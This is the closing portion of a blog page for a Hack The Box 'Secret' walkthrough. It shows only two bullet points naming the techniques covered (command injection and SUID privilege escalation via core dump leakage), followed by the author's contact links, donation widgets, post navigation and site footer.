<li>Command Injection with “;”</li>
<li>SUID Binaries PrivESC with CoreDump crash information leackage</li>
</ul>
<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/11/01/secret/" title="Hack-The-Box-walkthrough[Secret]">https://fdlucifer.github.io/2021/11/01/secret/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="custom mastodon"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/10/19/devzat/" rel="prev" title="Hack-The-Box-walkthrough[devzat]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[devzat]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/11/03/antidote/" rel="next" title="Hack-The-Box-pwn-challenge[antidote]">
                  Hack-The-Box-pwn-challenge[antidote] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">NaNm</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">NaN:aN</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  



  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
